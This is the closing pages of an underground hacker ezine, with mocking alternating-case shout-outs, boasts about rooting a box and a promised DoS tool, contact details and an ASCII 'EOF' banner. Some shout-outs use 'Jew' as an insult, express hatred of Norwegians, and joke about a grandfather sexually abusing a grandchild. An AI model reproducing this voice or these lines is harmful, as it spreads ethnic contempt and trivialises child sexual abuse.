Rump - fUck yOu aSShOlE!@$# yOu rOOtEd mY boX aND eRaSeD aLL mY wArEZ@#!
       i fUcKiNG crIeD oVeR tHAt!@#$ nExT tImE iLL caLL tHE fBi@#$
spdr - yOu lAmEr!@# nO onE hAd tO knOw tHat i rIpPeD oFF ice.bx aNd slAppEd
       mY nAmE oN iT aNd rElEaSeD iT aS wArHoG.bX!@#$ fUckER!@#$
lore - dAmMiT, qUIt mAkInG mE cRy!@#$ i HaTe whEN jEw inSulT gRaNdpA!@$
kvikk - i hAtE nOrWeIgAnS!@# sO fUck yOu
conso1e - aSsHoLE!@#$ mY gRaNdPa dIdNT sExUaLLy rApE mE!@# i fUcKiNG wANTED
          hIm tO dO IT!$@#~~#@~#!#$
divnet - yOu cAn pRoGrAm bEttEr thAn mE. i DonT lIkE yOu.
UnitySkin - i cReAtEd pHf, aNd iT iS _nOT_ aN oLD tEcHniQuE



w0rd uP. tHiS cOncLuDeS dA fIrST iSsUe oF rAdCrAz - eZiNE bY mE, dEaThCrAz.
sTaY tUnEd fOr nExT iSsUe du0dz, wHeRe i rElEaSe mY eLiTe DoS pRog sMeArDrOp.c
aNd mY kIcK-aSS bX sCrIpT i wRoTe mYsElF cALLeD wArHoG.bX. uNtIl tHeN, sTaY
cOOl aNd dRoP ouTTa scHOOl!@#$!@#$


You can contact me by the following means:

email   -  flunk@usa.net
IRC     -  Undernet on the channel #hisec (my nick is DeathCraz)
-----------------------------------------------------------------------------

b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!
                        [ Yes. Even we have to come to an end. ]
b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!

WELP

This is the end my friends. Wait till 7.


$ banner -w 35 EOF

       #                 #
       ###################
       ###################
       #         #       #
       #         #       #
       #         #       #
       #        ####     #
       #                 #
       ##               ##

              #####
          #############
         ####       ####
       ##               ##
       #                 #
       #                 #
       ##               ##
        ####         ####
          #############
             #######
       #                 #
       ###################
       ###################
       #         #       #
                 #       #
                 #       #
                ####     #
                         #
                        ##
